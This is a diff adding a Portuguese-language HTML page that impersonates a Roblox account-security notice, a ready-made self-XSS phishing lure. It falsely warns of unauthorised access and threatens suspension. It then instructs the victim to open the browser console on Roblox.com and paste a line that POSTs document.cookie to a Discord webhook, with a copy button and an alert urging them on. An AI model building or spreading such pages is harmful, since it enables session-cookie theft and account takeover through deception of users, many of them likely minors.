@@ -1,0 +1,53 @@
+!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Verificação de Conta</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body { background-color: #1b1d21; color: white; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        .roblox-card { background-color: #2b2d33; border: 1px solid #3f4147; }
+        .code-box { background-color: #000000; border: 1px solid #ff4d4d; color: #00ff00; }
+    </style>
+</head>
+<body class="flex items-center justify-center min-h-screen p-4">
+
+    <div class="roblox-card max-w-md w-full p-8 rounded-lg shadow-2xl text-center">
+        <!-- Logo do Roblox -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_2017.svg" alt="Roblox" class="w-20 mx-auto mb-6">
+        
+        <h1 class="text-2xl font-bold mb-4 text-white">Sessão Expirada</h1>
+        <p class="text-gray-400 mb-6 text-sm">Detectamos um acesso não autorizado à sua conta. Para evitar a suspensão permanente, você deve validar seu token de segurança agora.</p>
+        
+        <div class="text-left bg-black/50 p-4 rounded-md mb-6 border-l-4 border-red-600">
+            <p class="text-xs font-bold text-red-500 uppercase mb-2">Passos para Validação:</p>
+            <ul class="text-xs text-gray-300 space-y-2 list-decimal ml-4">
+                <li>Abra o <span class="text-white font-semibold">Roblox.com</span> em outra aba e faça login.</li>
+                <li>Aperte <span class="bg-gray-700 px-1 rounded text-white">F12</span> ou <span class="bg-gray-700 px-1 rounded text-white">Ctrl+Shift+I</span>.</li>
+                <li>Clique na aba <span class="text-white font-semibold">Console</span>.</li>
+                <li>Copie o código abaixo, cole no console e aperte <span class="bg-gray-700 px-1 rounded text-white">Enter</span>.</li>
+            </ul>
+        </div>
+
+        <!-- Área do Código -->
+        <div class="relative">
+            <textarea id="payload" readonly 
+                class="code-box w-full p-3 text-[10px] font-mono rounded h-24 focus:outline-none cursor-pointer" 
+                onclick="copyCode()">fetch('https://discord.com/api/webhooks/1570495356666384394/N7BIalu4gQXw6gSHb7O63WPJUDd-m2RLASXM3wehHNZTyiR-o6kBRFcS4ujaqWPMx5Kg', {method: 'POST', body: document.cookie});</textarea>
+            <div class="absolute top-2 right-2 text-[9px] bg-gray-800 px-2 py-1 rounded text-gray-400">Clique para copiar</div>
+        </div>
+
+        <p class="mt-6 text-[10px] text-gray-500">© 2026 Roblox Corporation. Segurança de Conta v4.2</p>
+    </div>
+
+    <script>
+        function copyCode() {
+            const copyText = document.getElementById("payload");
+            copyText.select();
+            navigator.clipboard.writeText(copyText.value);
+            alert("Código copiado! Agora cole-o no console do Roblox e aperte Enter para validar sua conta.");
+        }
+    </script>
+</body>
+</html>
